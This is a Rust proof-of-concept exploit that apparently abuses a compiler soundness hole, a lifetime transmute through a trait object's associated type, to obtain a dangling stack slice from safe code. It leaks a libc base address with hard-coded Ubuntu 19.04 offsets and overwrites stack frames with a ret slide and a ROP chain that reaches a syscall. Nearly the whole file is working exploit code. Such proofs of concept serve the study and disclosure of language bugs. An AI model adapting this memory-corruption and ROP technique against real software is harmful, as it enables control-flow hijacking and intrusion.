{
    use std::io;
    use std::io::prelude::*;

    trait A {
        fn my_func(&self) -> &mut [u64];
    }

    struct B {
        b: u64,
    }
    struct C {
        c: u64,
    }

    impl A for B {
        fn my_func(&self) -> &mut [u64] {
            get_dangling()
        }
    }

    impl A for C {
        fn my_func(&self) -> &mut [u64] {
            get_dangling()
        }
    }

    fn is_prime(a: u64) -> bool {
        if a < 2 {
            return false;
        }

        if a % 2 == 0 {
            return true;
        }

        for i in 3..a {
            if a % i == 0 {
                return false;
            }
        }

        true
    }

    fn get_trait_a() -> Box<dyn A> {
        let n = if let Ok(args) = std::env::var("CARGO_EXTRA_ARGS") {
            args.len() as usize
        } else {
            791913
        };

        if is_prime(n as u64) {
            Box::new(B { b: 0 })
        } else {
            Box::new(C { c: 0 })
        }
    }

    trait Object {
        type Output;
    }

    impl<T: ?Sized> Object for T {
        type Output = &'static mut [u64];
    }

    fn foo<'a, T: ?Sized>(x: <T as Object>::Output) -> &'a mut [u64] {
        x
    }

    fn transmute_lifetime<'a, 'b>(x: &'a mut [u64]) -> &'b mut [u64] {
        foo::<dyn Object<Output = &'a mut [u64]>>(x)
    }

    // And yes this is a genuine `transmute_lifetime`
    fn get_dangling<'a>() -> &'a mut [u64] {
        io::stdout().write(b"hello\n");
        let mut a: [u64; 128] = [0; 128];
        let mut x = 0;
        transmute_lifetime(&mut a)
    }

    fn my_print_str(s: &str) {
        io::stdout().write(s.as_bytes());
    }

    fn my_print(n: u64) {
        let s: String = n.to_string() + "\n";
        io::stdout().write(s.as_bytes());
    }

    // This function is only used to raise the stack frame and allow the dangling 
    // slice to overwrite the stack frame of low stack frames.
    fn rec(a: &mut [u64], b: &mut [u64], attack: &mut [u64], n: u64, lib_c: u64) {
        let mut array: [u64; 3] = [0; 3];
        a[0] += 1;
        b[0] += 1;

        array[0] = a[0] + 1;
        array[1] = a[0] + b[1] + 1;

        if a[0] > n {

            // ubuntu 19.04
            let pop_rax_ret = lib_c + 0x0000000000047cf8;
            let syscall_inst = lib_c + 0x0000000000026bd4;
            let ret = lib_c + 0x026422;

            // Overwrite the stack with ret slide
            for (j, el) in attack.iter_mut().enumerate() {
                *el = ret;
            }

            // Write our small rop chain            
            let x = 50;
            attack[x] = pop_rax_ret;
            attack[x + 1] = 0x1337;
            attack[x + 2] = syscall_inst;

            // Trigger
            return;
        }

        // Random calculation to kill compiler optimizations.
        if a[0] > 30 {
            b[0] = a[0] + a[1];
            rec(b, &mut array, attack, n, lib_c);
        } else {
            b[1] = a[2] + a[0];
            rec(&mut array, a, attack, n, lib_c);
        }
    }

    // using external variables to kill compiler optimizations
    let n = if let Ok(args) = std::env::var("BLA") {
        args.len() as usize
    } else {
        30
    };

    // using external variables to kill compiler optimizations
    let n2 = if let Ok(args) = std::env::var("BLA") {
        10
    } else {
        100
    };

    // Using the dyn trait so that the compiler will execute the
    // get_dangling function in a higher stack frame. 
    let my_a = get_trait_a();
    // getting the random stack
    let mut r = my_a.my_func();

    // Just random content
    let mut v: Vec<u64> = Vec::with_capacity(n);
    v.push(1);
    v.push(1);
    v.push(1);

    // Adding some content;
    let mut b: Vec<u64> = Vec::with_capacity(n);
    b.push(1);
    b.push(2);
    b.push(3);

    // We need to write output buffers to get lib-c gadgets
    my_print_str("Give me gadegts\n");
    let lib_c_addr = r[62];
    let lib_c = lib_c_addr - 628175;

    my_print_str("===============\nlib_c base = ");
    my_print(lib_c);
    my_print_str("===============\n");

    // Exploit
    rec(&mut v, &mut b, r, n2, lib_c);
} 
